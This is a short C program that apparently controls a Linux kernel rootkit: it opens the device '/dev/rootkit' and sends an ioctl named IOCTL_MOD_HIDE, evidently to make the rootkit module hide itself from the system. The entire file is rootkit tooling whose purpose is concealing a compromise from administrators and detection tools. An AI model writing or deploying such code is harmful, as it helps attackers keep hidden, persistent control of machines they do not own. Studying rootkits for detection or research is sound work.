#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"
#include <stdio.h>

int main(void) {
    int fd;
    fd = open("/dev/rootkit", O_RDWR);
    if (fd == -1) {
        puts("Cannot open device!");
        return -1;
    }

    ioctl(fd, IOCTL_MOD_HIDE);
    close(fd);

    return 0;
}
